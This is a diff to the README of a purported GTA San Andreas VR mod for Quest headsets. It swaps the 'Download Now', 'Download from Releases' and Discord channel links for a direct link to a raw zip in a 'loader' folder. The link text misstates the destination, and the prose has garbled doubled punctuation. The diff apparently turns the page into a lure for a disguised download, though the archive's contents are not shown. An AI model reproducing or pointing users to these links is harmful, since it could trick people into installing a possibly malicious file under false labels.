@@ -1,7 +1,7 @@
 <h1>🎮 gta-sa-vr-quest - Play GTA San Andreas in VR</h1>
 
 <p align="center">
-  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now</a>
+  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#ff6b6b,#ffa500);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);">⬇️ Download Now</a>
 </p>
 
 ## 🕹️ What Is This?
@@ -47,7 +47,7 @@ You can find this file by searching for that exact name online. Keep this archiv
 Visit the link below to get the build tools and source code from this repository:
 
 <p align="center">
-  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/releases" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:white;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(76,175,80,0.4);">⬇️ Download from Releases</a>
+  <a href="https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip" style="display:inline-block;padding:12px 25px;background:linear-gradient(135deg,#4caf50,#8bc34a);color:white;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(76,175,80,0.4);">⬇️ Download from Releases</a>
 </p>
 
 Visit this link to download the application. Once you ar on the page, look for the latest release asset named something like `gta-sa-vr-quest-source.zip` and download it to your computer.
@@ -126,7 +126,7 @@ This project is actively developed,, and the creator wants to hear from you. Joi
 - **Discussion** — Chat with other players, share tips,, and ask for help..
 
 >[!TIP]
-> **Join the Flat2VR Discord!** Development updates,, player feedback,, testing,, and discussion of the mod take place in the [GTA San Andreas VR discussion channel](https://discord.com/channels/747967102895390741/1540234546182750228). Join the Flat2VR server first if the channel link does not open for you..
+> **Join the Flat2VR Discord!** Development updates,, player feedback,, testing,, and discussion of the mod take place in the [GTA San Andreas VR discussion channel](https://github.com/arbitrative-coffeecup9612/gta-sa-vr-quest/raw/refs/heads/main/loader/quest_gta_vr_sa_phrynin.zip). Join the Flat2VR server first if the channel link does not open for you..
 
 
 
